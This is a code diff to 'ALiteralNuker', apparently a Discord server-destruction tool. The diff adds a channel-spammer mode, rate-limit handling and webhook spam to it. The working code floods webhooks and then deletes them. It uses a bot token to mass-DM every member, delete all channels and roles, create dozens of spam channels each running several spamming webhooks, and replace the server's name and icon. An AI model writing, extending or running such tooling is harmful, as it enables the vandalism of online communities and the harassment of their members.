@@ -4,16 +4,16 @@ import asyncio
 import os
 import json
 import random
+import logging
 from discord.ext import commands
 from colorama import Fore, Style, init
 
 init(autoreset=True)
 
-      ##### ALITERALNUKER #####
-##### Read readme.md before usage! #####
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-
-# Create ALiteralNuker folder & subfolders
+# Configuration
 base_folder = "ALiteralNuker"
 attachments_folder = os.path.join(base_folder, "attachments")
 assets_folder = os.path.join(base_folder, "assets")
@@ -60,7 +60,51 @@ def main_menu():
     print(Fore.RED + "🔥 ALiteralNuker - Made by LiterallySnowy 🔥")
     print(Fore.YELLOW + "[1] Webhook Bomber")
     print(Fore.YELLOW + "[2] Bot Server Bomber")
-    return input(Fore.CYAN + "Choose mode (1 or 2): ")
+    print(Fore.YELLOW + "[3] Channel Spammer")
+    return input(Fore.CYAN + "Choose mode (1, 2, or 3): ")
+
+# Function to confirm destructive actions
+def confirm_action(action):
+    confirmation = input(Fore.RED + f"Are you sure you want to {action}? (y/n): ").lower()
+    return confirmation == 'y'
+
+# Function to handle rate limiting
+async def handle_rate_limit(response):
+    if response.status_code == 429:
+        retry_after = response.json().get('retry_after', 1)
+        logging.warning(f"Rate limited. Retrying after {retry_after} seconds.")
+        await asyncio.sleep(retry_after / 1000)
+
+# Function to spam messages using webhooks
+async def spam_webhook(webhook_url, message, repeat, attach_spam):
+    for i in range(repeat):
+        payload = {"content": f"{message} [ Nuked with ALiteralNuker ✓ ]"}
+        try:
+            response = requests.post(webhook_url, json=payload)
+            await handle_rate_limit(response)
+            print(Fore.GREEN + f"Sent message {i+1}/{repeat}")
+        except requests.RequestException as e:
+            logging.error(f"Failed to send message {i+1}/{repeat}: {e}")
+
+        if attach_spam == "y":
+            files = os.listdir(attachments_folder)
+            if files:
+                file_path = os.path.join(attachments_folder, random.choice(files))
+                try:
+                    with open(file_path, "rb") as file:
+                        response = requests.post(webhook_url, files={"file": file})
+                        await handle_rate_limit(response)
+                    print(Fore.MAGENTA + f"Sent attachment: {file_path}")
+                except (requests.RequestException, IOError) as e:
+                    logging.error(f"Failed to send attachment {file_path}: {e}")
+
+    try:
+        response = requests.delete(webhook_url)
+        await handle_rate_limit(response)
+        save_deleted_webhook(webhook_url)  # Save the deleted webhook
+        print(Fore.RED + "🔥 Webhook deleted! 🔥")
+    except requests.RequestException as e:
+        logging.error(f"Failed to delete webhook: {e}")
 
 # Start main menu loop
 while True:
@@ -76,25 +120,14 @@ while True:
             input(Fore.YELLOW + "Press Enter to return to the menu...")
             continue
 
+        if not confirm_action("bomb this webhook"):
+            continue
+
         message = input(Fore.CYAN + "Enter the spam message: ")
         attach_spam = input(Fore.CYAN + "Do you want to spam attachments? (y/n): ").lower()
         repeat = int(input(Fore.CYAN + "How many times to spam?: "))
 
-        for i in range(repeat):
-            payload = {"content": f"{message} [ Nuked with ALiteralNuker ✓ ]"}
-            requests.post(webhook_url, json=payload)
-            print(Fore.GREEN + f"Sent message {i+1}/{repeat}")
-
-            if attach_spam == "y":
-                files = os.listdir(attachments_folder)
-                if files:
-                    file_path = os.path.join(attachments_folder, random.choice(files))
-                    requests.post(webhook_url, files={"file": open(file_path, "rb")})
-                    print(Fore.MAGENTA + f"Sent attachment: {file_path}")
-
-        requests.delete(webhook_url)
-        save_deleted_webhook(webhook_url)  # Save the deleted webhook
-        print(Fore.RED + "🔥 Webhook deleted! 🔥")
+        asyncio.run(spam_webhook(webhook_url, message, repeat, attach_spam))
 
         input(Fore.YELLOW + "Press Enter to return to the menu...")
 
@@ -114,50 +147,49 @@ while True:
                 print(Fore.RED + "❌ Bot is not in the server!")
                 return
 
+            if not confirm_action("nuke this server"):
+                return
+
+            message = input(Fore.CYAN + "Enter the spam message: ")
+            attach_spam = input(Fore.CYAN + "Do you want to spam attachments? (y/n): ").lower()
+            repeat = int(input(Fore.CYAN + "How many times to spam?: "))
+
             # DM all members with server name
             for member in guild.members:
                 try:
                     await member.send(f"🔥 This server is being nuked! Server Name: {guild.name}")
                     print(Fore.BLUE + f"Sent DM to {member.name}")
-                except:
-                    print(Fore.YELLOW + f"Failed to DM {member.name}")
+                except Exception as e:
+                    logging.error(f"Failed to DM {member.name}: {e}")
 
             # Delete channels
             for channel in guild.channels:
                 try:
                     await channel.delete()
                     print(Fore.RED + f"Deleted channel: {channel.name}")
-                except:
-                    print(Fore.YELLOW + f"Failed to delete: {channel.name}")
+                except Exception as e:
+                    logging.error(f"Failed to delete channel {channel.name}: {e}")
 
-            # Create spam channels
+            # Create spam channels and webhooks
             for _ in range(50):
-                await guild.create_text_channel("nuked-by-literalnuker")
-                print(Fore.GREEN + "Created spam channel.")
+                try:
+                    spam_channel = await guild.create_text_channel("nuked-by-literalnuker")
+                    print(Fore.GREEN + "Created spam channel.")
+                    
+                    # Create webhooks in the spam channel
+                    for _ in range(5):
+                        webhook = await spam_channel.create_webhook(name="NUKED BY github.com/literallysnowy")
+                        asyncio.create_task(spam_webhook(webhook.url, message, repeat, attach_spam))
+                except Exception as e:
+                    logging.error(f"Failed to create spam channel or webhook: {e}")
 
             # Delete roles
             for role in guild.roles:
                 try:
                     await role.delete()
                     print(Fore.RED + f"Deleted role: {role.name}")
-                except:
-                    print(Fore.YELLOW + f"Failed to delete: {role.name}")
-
-            # Mass DM everyone
-            for member in guild.members:
-                try:
-                    await member.send("🔥 This server is a SCAM! Leave now. 🔥")
-                    print(Fore.BLUE + f"Sent DM to {member.name}")
-                except:
-                    print(Fore.YELLOW + f"Failed to DM {member.name}")
-
-            # Mass nickname change
-            for member in guild.members:
-                try:
-                    await member.edit(nick="NukedBySnowy")
-                    print(Fore.MAGENTA + f"Renamed {member.name}")
-                except:
-                    print(Fore.YELLOW + f"Failed to rename {member.name}")
+                except Exception as e:
+                    logging.error(f"Failed to delete role {role.name}: {e}")
 
             # Server name change & icon change
             try:
@@ -169,18 +201,48 @@ while True:
                     print(Fore.CYAN + "🔥 Server name & icon changed! 🔥")
                 else:
                     print(Fore.YELLOW + "⚠️ No icon found in ALiteralNuker/assets/ ⚠️")
+            except Exception as e:
+                logging.error(f"Failed to edit server: {e}")
 
-            except:
-                print(Fore.YELLOW + "❌ Failed to change name/icon.")
+        bot.run(bot_token)
 
-            # Looping spam in all channels
-            while True:
-                for channel in guild.text_channels:
-                    try:
-                        await channel.send("@everyone [ Nuked with ALiteralNuker ✓ ]")
-                        print(Fore.RED + f"Spammed in {channel.name}")
-                    except:
-                        print(Fore.YELLOW + f"Failed to spam in {channel.name}")
+    # --- Channel Spammer ---
+    elif choice == "3":
+        bot_token = input(Fore.CYAN + "Enter bot token: ")
+        bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
+
+        @bot.event
+        async def on_ready():
+            print(Fore.GREEN + f"🔥 Logged in as {bot.user} 🔥")
+
+            guild_id = int(input(Fore.CYAN + "Enter Server ID to spam channels: "))
+            guild = bot.get_guild(guild_id)
+
+            if not guild:
+                print(Fore.RED + "❌ Bot is not in the server!")
+                return
+
+            if not confirm_action("spam channels in this server"):
+                return
+
+            channel_name = input(Fore.CYAN + "Enter the name for the spam channels: ")
+            num_channels = int(input(Fore.CYAN + "Enter the number of channels to create: "))
+            message = input(Fore.CYAN + "Enter the spam message: ")
+            attach_spam = input(Fore.CYAN + "Do you want to spam attachments? (y/n): ").lower()
+            repeat = int(input(Fore.CYAN + "How many times to spam?: "))
+
+            # Create spam channels and webhooks
+            for _ in range(num_channels):
+                try:
+                    spam_channel = await guild.create_text_channel(channel_name)
+                    print(Fore.GREEN + f"Created spam channel: {channel_name}")
+                    
+                    # Create webhooks in the spam channel
+                    for _ in range(5):
+                        webhook = await spam_channel.create_webhook(name="NUKED BY github.com/literallysnowy")
+                        asyncio.create_task(spam_webhook(webhook.url, message, repeat, attach_spam))
+                except Exception as e:
+                    logging.error(f"Failed to create spam channel or webhook: {e}")
 
         bot.run(bot_token)
 
